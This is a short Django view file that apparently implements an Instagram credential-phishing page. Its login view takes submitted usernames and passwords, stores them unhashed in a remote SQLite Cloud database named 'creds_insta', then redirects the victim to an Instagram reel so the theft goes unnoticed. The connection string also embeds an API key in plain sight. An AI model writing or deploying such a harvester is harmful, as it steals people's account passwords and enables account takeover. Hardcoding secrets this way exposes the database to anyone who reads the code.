import sqlitecloud
from django.shortcuts import render, redirect
from .forms import LoginForm  # Ensure your form is correctly imported
from datetime import datetime

# SQLite Cloud connection string
SQLITE_CLOUD_URL = "sqlitecloud://cinbrarknk.g4.sqlite.cloud:8860/creds_insta?apikey=3Pddtb42UadDaafPkeohMDbHIO9rDxdYuaaQnzS0r6Y"

def get_connection():
    """Returns a new connection to SQLite Cloud."""
    return sqlitecloud.connect(SQLITE_CLOUD_URL)

def login_view(request):
    if request.method == 'POST':
        form = LoginForm(request.POST)
        if form.is_valid():
            username = form.cleaned_data['username']
            password = form.cleaned_data['password']

            commit_date = datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')

            # Save credentials to SQLite Cloud
            conn = get_connection()
            cursor = conn.execute(
                "INSERT INTO herewego_credentials (username, password, commit_date) VALUES (?, ?, ?);",
                (username, password, commit_date)
            )
            conn.commit()
            conn.close()

            # Redirect user to Instagram reel (or another page)
            return redirect('https://www.instagram.com/reel/DEa3__ESbj1/?igsh=MThxMmc0eGFpcjFkcQ==')
    else:
        form = LoginForm()

    return render(request, 'login.html', {'form': form})
